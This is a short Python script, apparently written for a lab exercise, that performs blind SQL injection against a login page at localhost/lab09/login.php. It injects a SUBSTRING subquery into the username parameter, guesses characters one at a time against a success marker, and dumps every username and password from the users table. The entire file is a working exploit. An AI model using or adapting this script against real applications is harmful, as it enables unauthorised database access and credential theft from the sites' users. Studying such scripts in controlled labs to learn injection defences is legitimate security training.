import requests
import string

BASE_URL = "http://localhost/lab09/login.php"
SUCCESS_MARKER = "[+]"

CHARSET = string.ascii_letters + string.digits + string.punctuation
MAX_LEN = 64

def check(payload):
    params = {"u": payload, "p": "x"}
    try:
        r = requests.get(BASE_URL, params=params)
        return SUCCESS_MARKER in r.text
    except:
        return False

def extract_field(row_index, field_name):
    result = ""
    for pos in range(1, MAX_LEN + 1):
        found_char = False
        for ch in CHARSET:
            if ch in ('"', '\\', "'"): # Added single quote to skip list for stability
                continue
            
            # Line 26-28 area:
            payload = f"' OR SUBSTRING((SELECT {field_name} FROM users LIMIT {row_index},1),{pos},1)='{ch}' -- "
            if check(payload):
                result += ch
                found_char = True
                print(f"  Row {row_index+1} | {field_name}[{pos}] = {ch}", flush=True)
                break
        if not found_char:
            break
    return result

print("=== Blind SQL Injection Dump ===\n")
users = []

for i in range(100):
    print(f"[*] Extracting row {i+1}...")
    username = extract_field(i, "username")
    if not username:
        break
    password = extract_field(i, "password")
    users.append((username, password))
    print(f"  --> {username} : {password}\n")

print("\n=== RESULTS ===")
for u, p in users:
    print(f"{u} : {p}")
